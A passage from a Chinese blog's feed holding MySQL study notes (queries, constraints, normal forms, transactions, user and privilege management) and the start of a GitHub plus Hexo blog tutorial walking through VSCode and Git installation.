id="排序查询">排序查询</h3><h4 id="语法-7">语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 排序字段1 排序方式1, 排序字段2 排序方式2...</span><br></pre></td></tr></table></figure><h4 id="排序方式">排序方式</h4><ul><li>ASC：升序，默认。</li><li>DESC：降序。</li></ul><h4 id="注意-5">注意</h4><ul><li>如果有多个排序条件，则当前边的条件值一样时，才会判断第二条件。</li></ul><h3 id="聚合函数">聚合函数</h3><blockquote><p>将一列数据作为一个整体，进行纵向的计算。</p></blockquote><h4 id="语法-8">语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 函数名(列名) from 表名;</span><br></pre></td></tr></table></figure><h4 id="函数">函数</h4><ul><li>count：计算个数<ul><li>一般选择非空的列：主键</li><li>count(*)</li></ul></li><li>max：计算最大值</li><li>min：计算最小值</li><li>sum：计算和</li><li>avg：计算平均值</li></ul><h4 id="注意-6">注意</h4><ul><li>聚合函数的计算，排除null值。</li><li>解决方案：<ol><li>选择不包含非空的列进行计算</li><li>IFNULL函数</li></ol></li></ul><h3 id="分组查询">分组查询</h3><h4 id="语法-9">语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group by 分组字段;</span><br></pre></td></tr></table></figure><h4 id="注意-7">注意</h4><ul><li>分组之后查询的字段：分组字段、聚合函数</li><li>where 和 having 的区别？<ul><li>where 在分组之前进行限定，如果不满足条件，则不参与分组。having在分组之后进行限定，如果不满足结果，则不会被查询出来。</li><li>where 后不可以跟聚合函数，having可以进行聚合函数的判断。</li></ul></li></ul><h3 id="分页查询">分页查询</h3><h4 id="语法-10">语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit 开始的索引,每页查询的条数;</span><br></pre></td></tr></table></figure><h4 id="公式">公式</h4><ul><li>开始的索引 = （当前的页码 - 1） *  每页显示的条数</li></ul><h4 id="注意-8">注意</h4><ul><li><code>limit</code> 是一个 MySQL ”方言“。</li></ul><h2 id="约束">约束</h2><blockquote><p>对表中的数据进行限定，保证数据的正确性、有效性和完整性。</p></blockquote><h3 id="分类">分类</h3><table><thead><tr><th style="text-align:center">约束名</th><th style="text-align:center">约束关键字</th></tr></thead><tbody><tr><td style="text-align:center">主键</td><td style="text-align:center">primary key</td></tr><tr><td style="text-align:center">唯一</td><td style="text-align:center">unique</td></tr><tr><td style="text-align:center">非空</td><td style="text-align:center">not null</td></tr><tr><td style="text-align:center">外键</td><td style="text-align:center">foreign key</td></tr><tr><td style="text-align:center">检查</td><td style="text-align:center">check  注：MySQL 不支持</td></tr></tbody></table><h3 id="非空约束">非空约束</h3><blockquote><p><code>not null</code> ，某一列的值不能为<code>null</code></p></blockquote><ul><li><p>创建表时添加非空约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table 表名(</span><br><span class="line">变量1 int,</span><br><span class="line">变量2 varchar(32) not null -- 给变量2添加非空约束</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>创建表后添加非空约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify 变量2 varchar(32) not null;</span><br></pre></td></tr></table></figure></li><li><p>删除非空约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify 变量2 varchar(32);</span><br></pre></td></tr></table></figure></li></ul><h3 id="唯一约束">唯一约束</h3><blockquote><p><code>unique</code> ，某一列的值不能重复</p></blockquote><ul><li><p>唯一约束可以有 NULL 值，但是只能有一条记录为 NULL.</p></li><li><p>创建表时添加唯一约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table 表名(</span><br><span class="line">变量1 int,</span><br><span class="line">变量2 varchar(32) unique   -- 给变量2添加唯一约束</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li><p>创建表后添加唯一约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify 变量2 varchar(32) unique;</span><br></pre></td></tr></table></figure></li><li><p>删除唯一约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 drop index 变量2;</span><br></pre></td></tr></table></figure></li></ul><h3 id="主键约束">主键约束</h3><blockquote><ol><li><p><code>primary key</code> 非空且唯一</p></li><li><p>一张表只能有一个字段为主键</p></li><li><p>主键就是表中记录的唯一标识</p></li></ol></blockquote><ul><li><p>创建表时添加主键约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table 表名(</span><br><span class="line">变量1 int primary key,  -- 给变量1添加主键约束</span><br><span class="line">变量2 varchar(32)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>创建表后添加主键约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify 变量1 int primary key;</span><br></pre></td></tr></table></figure></li><li><p>删除主键约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 drop primary key;</span><br></pre></td></tr></table></figure></li><li><p>自动增长</p><blockquote><p>如果某一列是数值类型的，使用 <code>auto_increment</code> 可以来完成值得自动增长，一般配合主键使用。</p></blockquote><ul><li><p>创建表时添加主键约束，并且完成主键自动增长</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table 表名(</span><br><span class="line">变量1 int primary key auto_increment,</span><br><span class="line">变量2 varchar(32)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>添加自动增长</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify 变量1 int auto_incremrnt;</span><br></pre></td></tr></table></figure></li><li><p>删除自动增长</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify 变量1 int;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="外键约束">外键约束</h3><blockquote><p><code>foreign key</code> ，让表与表产生关系，从而保证数据的正确性。</p></blockquote><ul><li><p>创建表时添加外键约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table 表名(</span><br><span class="line">...</span><br><span class="line">外键列,</span><br><span class="line">constraint 外键名称 foreign key (外键列名称) references 主键名称(主表列名称)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>创建表后添加外键约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 add constraint 外键名称 foreign key (外键列名称) references 主表名称(主表列名称);</span><br></pre></td></tr></table></figure></li><li><p>删除外键约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 drop foreign key 外键名称;</span><br></pre></td></tr></table></figure></li><li><p>级联操作</p><ul><li><p>分类</p><ul><li>级联更新：on update cascade</li><li>级联删除：on delete cascade</li></ul></li><li><p>添加级联操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 add constraint 外键名称 foreign key (外键列名称) references 主表名称(主表列名称) on update cascade on delete cascade;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="数据库的设计">数据库的设计</h2><h3 id="多表关系">多表关系</h3><h4 id="一对一">一对一</h4><ul><li><p><strong>举例</strong>：人和身份证</p></li><li><p><strong>分析</strong>：一个人只有一个身份证，一个身份证只能对应一个人。</p></li><li><p><strong>实现</strong>：一对一关系实现，可以在任意一方添加唯一外键指向另一方的主键。（那其实一张表能解决。）</p></li></ul><h4 id="一对多（多对一）">一对多（多对一）</h4><ul><li><p><strong>举例</strong>：部门和员工</p></li><li><p><strong>分析</strong>：一个部门有多个员工，一个员工只能对应一个部门。</p></li><li><p><strong>实现</strong>：在<code>多</code>的一方建立外键，指向<code>一</code>的一方的主键。</p></li></ul><h4 id="多对多">多对多</h4><ul><li><p><strong>举例</strong>：学生和课程</p></li><li><p><strong>分析</strong>：一个学生可以选择很多门课程，一个课程也可以被很多学生选择。</p></li><li><p><strong>实现</strong>：多对多关系实现需要借助第三张中间表。中间表至少包含两个字段，这两个字段作为第三张表的外键，分别指向两张表的主键</p></li></ul><h3 id="数据库范式">数据库范式</h3><blockquote><p>设计数据库时，需要遵循的一些规范。要遵循后面的范式要求，必须先遵循前面的所有范式要求</p></blockquote><h4 id="第一范式（1NF）">第一范式（1NF）</h4><ul><li>每一列都是不可分割的原子数据项</li></ul><h4 id="第二范式（2NF）">第二范式（2NF）</h4><ul><li><p>在 <code>1NF</code> 的基础上，非码属性必须完全依赖于码（在 <code>1NF</code> 基础上消除非主属性对主码的部分函数依赖）</p></li><li><p>几个概念</p><ol><li><p><strong>函数依赖</strong>：A–&gt;B ，如果通过A属性（属性组）的值，可以确定唯一B属性的值，则称B依赖于A。</p><ul><li>例如：学号–&gt;姓名。  （学号，课程名称） --&gt; 分数</li></ul></li><li><p><strong>完全函数依赖</strong>：A–&gt;B ， 如果A是一个属性组，则B属性值的确定需要依赖于A属性组中所有的属性值。</p><ul><li>例如：（学号，课程名称） --&gt; 分数</li></ul></li><li><p><strong>部分函数依赖</strong>：A–&gt;B ， 如果A是一个属性组，则B属性值的确定只需要依赖于A属性组中某一些值即可。</p><ul><li>例如：（学号，课程名称） – &gt; 姓名</li></ul></li><li><p><strong>传递函数依赖</strong>：A–&gt;B ，B --&gt;C ，如果通过A属性（属性组）的值，可以确定唯一B属性的值，在通过B属性（属性组）的值可以确定唯一C属性的值，则称 C 传递函数依赖于A。</p><ul><li>例如：学号–&gt;系名，系名–&gt;系主任</li></ul></li><li><p><strong>码</strong>：如果在一张表中，一个属性或属性组，被其他所有属性所依赖，则称这个属性（属性组）为该表的码。</p><ul><li>例如：该表中码为：（学号，课程名称）</li><li>主属性：码属性组中的所有属性</li><li>非主属性：除了码属性组的属性</li></ul></li></ol></li></ul><h4 id="第三范式（3NF）">第三范式（3NF）</h4><ul><li>在 <code>2NF</code> 基础上，任何非主属性不依赖于其它非主属性（在 <code>2NF</code> 基础上消除传递依赖）</li></ul><h3 id="数据库的备份和还原">数据库的备份和还原</h3><h4 id="语法-11">语法</h4><ul><li><p>备份（命令行）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u用户名 -p密码 数据库名称 &gt; 保存的路径</span><br></pre></td></tr></table></figure></li><li><p>还原（命令行）</p><ul><li><p>登录数据库</p></li><li><p>创建数据库</p></li><li><p>使用数据库</p></li><li><p>执行文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source 文件路径</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="多表查询">多表查询</h2><h3 id="语法-12">语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">列名列表</span><br><span class="line">from</span><br><span class="line">表名列表</span><br><span class="line">where....;</span><br></pre></td></tr></table></figure><h3 id="内连接查询">内连接查询</h3><ul><li><p>隐式内连接</p><ul><li>使用where条件消除无用数据</li></ul></li><li><p>显式内连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段列表 from 表名1 [inner] join 表名2 on 条件;</span><br></pre></td></tr></table></figure></li><li><p>注意</p><ul><li>从哪些表中查询数据</li><li>条件是什么</li><li>查询哪些字段</li></ul></li></ul><h3 id="外连接查询">外连接查询</h3><ul><li><p>左外连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段列表 from 表1 left [outer] join 表2 on 条件;</span><br></pre></td></tr></table></figure><ul><li>查询的是左表所有数据以及其交集部分。</li></ul></li><li><p>右外连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段列表 from 表1 right [outer] join 表2 on 条件;</span><br></pre></td></tr></table></figure><ul><li>查询的是右表所有数据以及其交集部分。</li></ul></li></ul><h3 id="子查询">子查询</h3><blockquote><p>查询中嵌套查询，称嵌套查询为子查询。</p></blockquote><ul><li><p>子查询的结果是单行单列的</p><ul><li>子查询可以作为条件，使用运算符去判断。</li></ul></li><li><p>子查询的结果是多行单列的</p><ul><li>子查询可以作为条件，使用运算符in来判断。</li></ul></li><li><p>子查询的结果是多行多列的</p><ul><li>子查询可以作为一张虚拟表参与查询。</li></ul></li></ul><h2 id="事务">事务</h2><blockquote><p>如果一个包含多个步骤的业务操作，被事务管理，那么这些操作要么同时成功，要么同时失败。</p></blockquote><h3 id="操作">操作</h3><ol><li><p>开启事务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start transaction;</span><br></pre></td></tr></table></figure></li><li><p>回滚：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rollback;</span><br></pre></td></tr></table></figure></li><li><p>提交：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit;</span><br></pre></td></tr></table></figure><ul><li><p>自动提交：</p><ul><li>MySQL数据库中事务默认自动提交</li><li>一条DML（增删改）语句会自动提交一次事务。</li></ul></li><li><p>手动提交：</p><ul><li>Oracle 数据库默认手动提交事务</li><li>需要先开启事务，再提交</li></ul></li><li><p>查看事务的默认提交方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@autocommit;</span><br></pre></td></tr></table></figure><ul><li>1 代表自动提交</li><li>0 代表手动提交</li></ul></li><li><p>修改默认提交方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @@autocommit = 0;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="四大特征">四大特征</h3><ol><li><strong>原子性</strong>：是不可分割的最小操作单位，要么同时成功，要么同时失败。</li><li><strong>持久性</strong>：当事务提交或回滚后，数据库会持久化的保存数据。</li><li><strong>隔离性</strong>：多个事务之间。相互独立。</li><li><strong>一致性</strong>：事务操作前后，数据总量不变。</li></ol><h3 id="隔离级别">隔离级别</h3><blockquote><p>多个事务之间是隔离的，相互独立的。但是如果多个事务操作同一批数据，则会引发一些问题，设置不同的隔离级别就可以解决这些问题。</p></blockquote><h4 id="问题">问题</h4><ol><li><strong>脏读</strong>：一个事务，读取到另一个事务中没有提交的数据。</li><li><strong>不可重复读（虚读）</strong>：在同一个事务中，两次读取到的数据不一样。</li><li><strong>幻读</strong>：一个事务操作 (DML) 数据表中所有记录，另一个事务添加了一条数据，则第一个事务查询不到自己的修改。</li></ol><h4 id="级别">级别</h4><ol><li><strong>read uncommitted</strong>：读未提交<ul><li>产生的问题：脏读、不可重复读、幻读</li></ul></li><li><strong>read committed</strong>：读已提交 （Oracle默认）<ul><li>产生的问题：不可重复读、幻读</li></ul></li><li><strong>repeatable read</strong>：可重复读 （MySQL默认）<ul><li>产生的问题：幻读</li></ul></li><li><strong>serializable</strong>：串行化<ul><li>可以解决所有的问题</li></ul></li></ol><ul><li><p>注意：隔离级别从小到大安全性越来越高，但是效率越来越低</p></li><li><p>数据库查询隔离级别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@tx_isolation;</span><br></pre></td></tr></table></figure></li><li><p>数据库设置隔离级别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global transaction isolation level  级别字符串;</span><br></pre></td></tr></table></figure></li></ul><h2 id="DCL-管理用户，授权-数据控制语言">DCL: 管理用户，授权(数据控制语言)</h2><blockquote><p>DBA: 数据库管理员</p></blockquote><h3 id="用户管理">用户管理</h3><ul><li><p>添加用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &#x27;用户名&#x27;@&#x27;主机名&#x27; IDENTIFIED BY &#x27;密码&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>删除用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP USER &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>修改用户密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE USER SET PASSWORD = PASSWORD(&#x27;新密码&#x27;) WHERE USER = &#x27;用户名&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET PASSWORD FOR &#x27;用户名&#x27;@&#x27;主机名&#x27; = PASSWORD(&#x27;新密码&#x27;);</span><br></pre></td></tr></table></figure><ul><li><p>mysql 中忘记了 root 用户的密码？</p><ol><li><p>管理员运行 cmd 停止 mysql 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop mysql</span><br></pre></td></tr></table></figure></li><li><p>使用无验证方式启动 mysql 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --skip-grant-tables</span><br></pre></td></tr></table></figure></li><li><p>管理员运行新的 cmd ，直接输入 mysql 命令就可以登录成功。</p></li><li><p>输入以下指令修改密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set password = password(&#x27;你的新密码&#x27;) where user = &#x27;root&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>关闭两个窗口</p></li><li><p>打开任务管理器，手动结束 mysqld.exe 的进程</p></li><li><p>启动 mysql 服务</p></li><li><p>使用新密码登录。</p></li></ol></li></ul></li><li><p>查询用户</p><ul><li><p>切换到mysql数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE myql;</span><br></pre></td></tr></table></figure></li><li><p>查询user表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM USER;</span><br></pre></td></tr></table></figure></li><li><p>通配符：<strong>%</strong> 表示可以在任意主机使用用户登录数据库</p></li></ul></li></ul><h3 id="权限管理">权限管理</h3><ul><li><p>查询权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW GRANTS FOR &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>授予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant 权限列表(all) on 数据库名(*).表名(* ) to &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>撤销权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">revoke 权限列表 on 数据库名.表名 from &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> MySQL </tag>
            
            <tag> JavaWeb </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用GitHub+Hexo搭建个人博客</title>
      <link href="/posts/7d4f898b/"/>
      <url>/posts/7d4f898b/</url>
      
        <content type="html"><![CDATA[<h1>使用 GitHub + Hexo 搭建个人博客</h1><h2 id="提前准备">提前准备</h2><ol><li>网络（尽量保证信号畅通）</li><li>电脑（Windows）</li><li>电源（220V）</li><li>精力</li><li><s>本教程图片存储于腾讯公共图床</s>，原图床果然还是失效了，教程图片全部迁移至去不图床，失效可联系邮箱：1547563662@qq.com</li></ol><h2 id="工具安装">工具安装</h2><h3 id="VSCode-安装：">VSCode 安装：</h3><ol><li>到 <a href="https://code.visualstudio.com/">Visual Studio Code 官网</a>下载 VSCode 安装包。</li></ol><blockquote><p>点击左侧 <code>Download for Windows</code> 即可直接跳转下载。</p><p>右上角 <code>Download</code> 可选择更多版本下载。</p><p>这里提供 <a href="https://h-t-m.lanzoui.com/i70mqwhpuva">VSCodeUserSetup-x64-1.62.2.exe 蓝奏云</a>下载。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/6ebc51e598a05.webp" alt="" style="zoom: 25%;" /><img src="https://bu.dusays.com/2022/01/06/e9a5d6af93736.webp" alt="" style="zoom:25%;" /><ol start="2"><li>安装 VSCode</li></ol><ul><li>直接双击打开下载好的安装程序，进入许可协议页面，一点要点击同意才能进入下一步。</li></ul><img src="https://bu.dusays.com/2022/01/06/28cfbec14e635.webp" alt="" style="zoom:33%;" /><ul><li>单击 <code>下一步</code> 之后进入安装目录的选择，默认为 C盘，可修改为自定义目录。</li></ul><img src="https://bu.dusays.com/2022/01/06/c856afd91348b.webp" alt="" style="zoom:33%;" /><ul><li>单击 <code>下一步</code> 之后进入开始菜单设置，默认即可。</li></ul><img src="https://bu.dusays.com/2022/01/06/d87eeb6d268c0.webp" alt="" style="zoom:33%;" /><ul><li>单击 <code>下一步</code> 之后进入附加任务选择，为方便以后工作，这里全部选中。</li></ul><img src="https://bu.dusays.com/2022/01/06/29b9689f269e4.webp" alt="" style="zoom:33%;" /><ul><li>单击 <code>下一步</code> 之后进入最终安装确认，确认无误点击 <code>安装</code> 即可。</li></ul><img src="https://bu.dusays.com/2022/01/06/0e35f40da6fdc.webp" alt="" style="zoom:33%;" /><ul><li>等待进度条走完。</li></ul><img src="https://bu.dusays.com/2022/01/06/329f3ee8269ba.webp" alt="" style="zoom:33%;" /><ul><li>安装完成后可直接运行。</li></ul><img src="https://bu.dusays.com/2022/01/06/8905fd6fe4e9c.webp" alt="" style="zoom:33%;" /><ul><li>如图即为 VSCode 的主界面。后续可根据需要增加插件，VSCode 是非常好用的文档编辑器。</li></ul><img src="https://bu.dusays.com/2022/01/06/3460a360c18c0.webp" alt="" style="zoom:33%;" /><h3 id="Git-安装：">Git 安装：</h3><ol><li>到 <a href="https://git-scm.com/">Git 官网</a>下载 Git 安装包。</li></ol><img src="https://bu.dusays.com/2022/01/06/dd812201cd90b.webp" alt="" style="zoom: 20%;" /><blockquote><p>点击 <code>Download for Windows</code>，Git 官网会直接识别电脑的操作系统并提供对应安装包，这里示范为 Windows 系统。</p><p>也可以点击左下角 <code>Downloads</code> 选择其他安装包。</p><p>提供 <a href="https://h-t-m.lanzoui.com/idXOQw2kdmj">Git-2.33.1-64-bit.exe蓝奏云</a> 下载。</p></blockquote><ol start="2"><li>安装 Git</li></ol><ul><li>下载完成后直接双击打开安装包，这里示范 Git v2.33.1。</li></ul><blockquote><p>若以前有安装过 Git，则这一页会显示 <code>Install</code> 按钮，点击即可直接按原来的配置直接安装，如果要重新自定义配置，请先将电脑中的 Git 卸载。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/f3c7dd31a3d26.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入安装目录选择页面。</li></ul><blockquote><p>默认安装在 C盘，可以自定义安装在别的地方，这里示范安装在 D盘。</p><p>这一步往后**直接点击 <code>Next</code> **即可，默认配置就足够了。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/e3f70c344a4f6.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入组件选择页面，默认即可。</li></ul><blockquote><p>前两行表示是否在桌面创建快捷方式；</p><p>中间默认勾选部分建议不要动；</p><p>倒数第二个表示是否每日检查更新；</p><p>最后一个表示是否将 Git 命令行添加到 Windows 终端（可进一步美化）。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/d05aa8c46fd2b.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入开始菜单设置，默认即可。</li></ul><blockquote><p>默认放在开始菜单的 <code>Git</code> 文件夹，也可修改文件夹名称或选择其他文件夹。</p><p>勾选下面选项则不创建开始菜单文件夹（即无法从开始菜单打开）。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/9b12b36877974.webp" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入默认编辑器选择， 默认即可。</li></ul><blockquote><p>默认选择 Vim，这里示范使用 Visual Studio Code 作为默认编辑器。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/000a6b8c3fc37.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入选择修改初始化分支的名称页面，默认即可。</li></ul><blockquote><p>默认选择让 Git 决定，也可以选择下一项自定义名称，默认修改为 main，也可自行修改为自定义名称。</p><p>各大开源社区已渐渐将默认分支名称由 master 变更为 main。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/133e5e37d71c3.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入 PATH 环境调整页面，默认即可。</li></ul><blockquote><p>第一种“仅从 Git Bash 使用 Git”，选择后将不能通过第三方软件使用 Git。</p><p>第二种“从命令行以及第三方软件使用 Git ”，默认选此项。</p><p>第三种“从命令行使用可选的 Unix 工具和 Git ”，此项会覆盖 Windows 工具，请谨慎选择。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/1bc0a88927bab.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入选择 ssh 可执行文件页面，默认即可。</li></ul><img src="https://bu.dusays.com/2022/01/06/0f2b2aaaee4bc.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入选择后台客户端连接协议页面，默认即可。</li></ul><blockquote><p>第一个“使用 OpenSSL 库”。服务器证书将使用 ca-bundle.crt 文件进行验证，一般选这项。</p><p>第二个“使用本地 Windows 安全通道库”。服务器证书将使用 Windows 证书存储验证，此选项还允许您使用公司的内部根 CA证书。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/240b18409d716.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入配置行末换行符页面。默认即可。</li></ul><blockquote><p>第一个选项是“签出 Windows 风格，提交 Unix 风格的行尾”。签出文本文件时，Git 会将 LF 转换为 CRLF。提交文本文件时，CRLF 将转换为 LF。对于跨平台项目，这是 Windows 上的推荐设置（“ core.autocrlf” 设置为 “ true”）。</p><p>第二个选项是“按原样签出，提交 Unix 样式的行尾”。签出文本文件时，Git 不会执行任何转换。 提交文本文件时，CRLF 将转换为 LF。对于跨平台项目，这是 Unix 上的建议设置（“ core.autocrlf” 设置为 “ input”）。</p><p>第三种选项是“按原样签出，按原样提交”。当签出或提交文本文件时，Git 不会执行任何转换。不建议跨平台项目选择此选项（“ core.autocrlf” 设置为 “false”）。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/3a584049ee1e9.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入配置 Git Bash 终端类型页面。默认即可。</li></ul><blockquote><p>第一个“使用 MinTTY（MSYS2 的默认终端）”。Git Bash 将使用 MinTTY 作为终端模拟器，该模拟器具有可调整大小的窗口，非矩形选择和 Unicode 字体。Windows 控制台程序必须通过 “winpty” 启动才能在 MinTTY中运行。</p><p>第二个选项是“使用 Windows 的默认控制台窗口”。Git将使用 Windows 的默认控制台窗口（“cmd.exe”），该窗口可以与 Win32控制台程序（如交互式 Python 或 node.js）一起使用，但默认的回滚非常有限，需要配置为使用 unicode 字体以正确显示非 ASCII 字符，并且在 Windows 10 之前，其窗口不能自由调整大小，并且只允许矩形文本选择。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/ab64724c7040b.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入选择默认从远程库拉取代码到本地库的行为的页面，默认即可。</li></ul><img src="https://bu.dusays.com/2022/01/06/506625bbf3202.webp" 